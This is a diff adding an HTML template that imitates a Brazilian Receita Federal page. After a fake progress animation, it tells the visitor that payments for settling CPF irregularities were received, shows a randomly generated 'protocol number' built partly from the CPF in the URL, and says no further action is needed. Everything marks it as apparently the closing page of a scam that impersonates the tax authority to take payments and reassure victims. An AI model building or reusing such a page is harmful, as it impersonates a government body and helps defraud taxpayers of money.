@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "vd01982f3b");
+    </script>
+    <meta charset="utf-8"/>
+    <title>Regularização em Processamento — Receita Federal</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdngovbr-ds.estaleiro.serpro.gov.br/design-system/fonts/rawline/css/rawline.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:300,400,500,600,700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="/static/rfb-header.css">
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            max-width: 100vw;
+            overflow-x: hidden;
+            margin: 0;
+            background: #f5f5f5;
+        }
+        .main-page {
+            display: none;
+            opacity: 0;
+        }
+        .main-page.active {
+            display: block;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loading-popup" class="rfb-loader-overlay" style="display: flex;">
+        <img src="/static/logo-receita.png" alt="Receita Federal">
+        <p class="rfb-loader-text">Finalizando processo...</p>
+        <div class="rfb-loader-track"><div class="rfb-loader-bar"></div></div>
+        <div class="rfb-loader-percent">0%</div>
+    </div>
+
+    {% include 'global_loader.html' %}
+
+    <div id="main-page" class="main-page">
+        {% include 'rfb_header.html' %}
+
+        <div style="background:#f5f5f5; min-height: calc(100vh - 120px);">
+            <div class="px-4 py-6">
+                <div style="max-width: 680px; margin: 0 auto;">
+
+                    <div style="background: #FFFFFF; border: 1px solid #c8cdd3; box-shadow: 0 2px 8px rgba(0,0,0,0.06), 0 1px 3px rgba(0,0,0,0.04); overflow: hidden;">
+
+                        <div style="background: #071D41; padding: 16px 24px; display: flex; align-items: center; gap: 10px;">
+                            <i class="fas fa-check-circle" style="color: #168821; font-size: 18px;"></i>
+                            <span style="color: #ffffff; font-weight: 600; font-size: 13px; letter-spacing: 0.3px; text-transform: uppercase; font-family: 'Inter', 'Rawline', sans-serif;">Solicitação Registrada</span>
+                        </div>
+
+                        <div style="padding: 28px 24px; text-align: center;">
+                            <div style="width: 64px; height: 64px; background: #E8F5E9; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                                <i class="fas fa-check" style="color: #168821; font-size: 28px;"></i>
+                            </div>
+
+                            <p style="font-size: 18px; font-weight: 700; color: #071D41; margin-bottom: 6px; font-family: 'Inter', 'Rawline', sans-serif;">
+                                Obrigado, <span id="nome-usuario"></span>
+                            </p>
+                            <p style="font-size: 13px; color: #555d68; margin-bottom: 24px; font-family: 'Inter', 'Rawline', sans-serif;">
+                                Seus pagamentos foram recebidos com sucesso.
+                            </p>
+
+                            <div style="border-top: 1px solid #e1e5eb; padding-top: 20px;">
+                                <div style="background: #F8F9FA; border: 1px solid #DEE2E6; padding: 20px 24px; text-align: left;">
+                                    <p style="font-size: 14px; font-weight: 600; color: #071D41; margin-bottom: 12px; font-family: 'Inter', 'Rawline', sans-serif;">
+                                        <i class="fas fa-sync-alt" style="color: #1351B4; margin-right: 6px;"></i>
+                                        Regularização em processamento
+                                    </p>
+                                    <p style="font-size: 13px; color: #333; line-height: 1.7; font-family: 'Inter', 'Rawline', sans-serif; margin-bottom: 14px;">
+                                        A sua solicitação de regularização das pendências vinculadas ao seu CPF foi registrada com sucesso no sistema da Receita Federal. O processo de atualização cadastral já está em andamento.
+                                    </p>
+                                    <p style="font-size: 13px; color: #333; line-height: 1.7; font-family: 'Inter', 'Rawline', sans-serif; margin-bottom: 0;">
+                                        Agora é só aguardar — qualquer atualização sobre o status da sua regularização será comunicada diretamente a você pelos canais oficiais da Receita Federal.
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div style="margin-top: 20px; background: #EBF2FF; border-left: 3px solid #1351B4; padding: 14px 18px; text-align: left;">
+                                <p style="font-size: 12px; color: #071D41; line-height: 1.6; font-family: 'Inter', 'Rawline', sans-serif; margin: 0;">
+                                    <i class="fas fa-info-circle" style="color: #1351B4; margin-right: 4px;"></i>
+                                    <strong>Prazo estimado:</strong> a atualização nos sistemas pode levar até 72 horas úteis. Não é necessária nenhuma ação adicional da sua parte.
+                                </p>
+                            </div>
+
+                            <div style="margin-top: 20px; padding: 16px 0 0; border-top: 1px solid #e1e5eb;">
+                                <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 4px;">
+                                    <i class="fas fa-shield-alt" style="color: #168821; font-size: 14px;"></i>
+                                    <p style="font-size: 12px; color: #555d68; font-family: 'Inter', 'Rawline', sans-serif; margin: 0;">
+                                        Protocolo nº <strong id="protocolo-numero" style="color: #071D41;"></strong>
+                                    </p>
+                                </div>
+                                <p style="font-size: 11px; color: #888; font-family: 'Inter', 'Rawline', sans-serif; margin: 4px 0 0;">
+                                    Receita Federal do Brasil — Ministério da Fazenda
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+        {% include 'rfb_footer.html' %}
+    </div>
+
+    <script src="/static/rfb-header.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const nome = urlParams.get('nome') || '';
+        const cpf = urlParams.get('cpf') || '';
+
+        function gerarProtocolo() {
+            const agora = new Date();
+            const ano = agora.getFullYear();
+            const mes = String(agora.getMonth() + 1).padStart(2, '0');
+            const dia = String(agora.getDate()).padStart(2, '0');
+            const random = Math.floor(Math.random() * 900000 + 100000);
+            return ano + '.' + mes + dia + '.' + random + '-' + cpf.substring(0, 3);
+        }
+
+        async function iniciarCarregamento() {
+            rfbAnimateLoader('loading-popup', [
+                { at: 25, text: 'Registrando pagamentos...' },
+                { at: 50, text: 'Atualizando sistema...' },
+                { at: 75, text: 'Gerando protocolo...' },
+                { at: 95, text: 'Processo concluído', color: '#168821' }
+            ], 3500, function(t) {
+                t.textContent = 'Tudo certo!';
+                t.style.color = '#168821';
+            });
+
+            await new Promise(resolve => setTimeout(resolve, 4000));
+
+            var primeiroNome = (nome || 'Contribuinte').split(' ')[0];
+            primeiroNome = primeiroNome.charAt(0).toUpperCase() + primeiroNome.slice(1).toLowerCase();
+            document.getElementById('nome-usuario').textContent = primeiroNome;
+            document.getElementById('protocolo-numero').textContent = gerarProtocolo();
+
+            var signInEl = document.getElementById('rfb-sign-in-name');
+            if (signInEl) signInEl.textContent = primeiroNome;
+
+            rfbHideLoader('loading-popup', function() {
+                document.getElementById('main-page').classList.add('active');
+            });
+        }
+
+        iniciarCarregamento();
+    </script>
+</body>
+</html>
